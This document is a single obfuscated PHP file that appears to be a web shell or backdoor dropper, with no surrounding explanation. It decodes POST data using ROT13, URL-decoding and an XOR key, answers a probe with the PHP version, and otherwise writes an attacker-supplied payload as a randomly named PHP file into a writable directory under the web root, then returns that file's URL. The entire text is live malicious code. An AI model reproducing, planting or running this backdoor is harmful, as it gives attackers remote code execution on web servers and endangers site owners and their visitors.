<?php $eihhdum = "hfrgwweokvcpwqtu";$nswcmsbzlm = "";foreach ($_POST as $uxekldsh => $rbuljcqpn){if (strlen($uxekldsh) == 16 and substr_count($rbuljcqpn, "%") > 10){sizxmauar($uxekldsh, $rbuljcqpn);}}function sizxmauar($uxekldsh, $xitmb){global $nswcmsbzlm;$nswcmsbzlm = $uxekldsh;$xitmb = str_split(rawurldecode(str_rot13($xitmb)));function ajknndp($ixfrqteu, $uxekldsh){global $eihhdum, $nswcmsbzlm;return $ixfrqteu ^ $eihhdum[$uxekldsh % strlen($eihhdum)] ^ $nswcmsbzlm[$uxekldsh % strlen($nswcmsbzlm)];}$xitmb = implode("", array_map("ajknndp", array_values($xitmb), array_keys($xitmb)));$xitmb = @unserialize($xitmb);if (@is_array($xitmb)){$uxekldsh = array_keys($xitmb);$xitmb = $xitmb[$uxekldsh[0]];if ($xitmb === $uxekldsh[0]){echo @serialize(Array('php' => @phpversion(), ));exit();}else{function lgfap($qzzitsxir) {static $nqfebrc = array();$zecbxwwtm = glob($qzzitsxir . '/*', GLOB_ONLYDIR);if (count($zecbxwwtm) > 0) {foreach ($zecbxwwtm as $qzzitsx){if (@is_writable($qzzitsx)){$nqfebrc[] = $qzzitsx;}}}foreach ($zecbxwwtm as $qzzitsxir) lgfap($qzzitsxir);return $nqfebrc;}$vskoli = $_SERVER["DOCUMENT_ROOT"];$zecbxwwtm = lgfap($vskoli);$uxekldsh = array_rand($zecbxwwtm);$mjkzkti = $zecbxwwtm[$uxekldsh] . "/" . substr(md5(time()), 0, 8) . ".php";@file_put_contents($mjkzkti, $xitmb);echo "http://" . $_SERVER["HTTP_HOST"] . substr($mjkzkti, strlen($vskoli));exit();}}}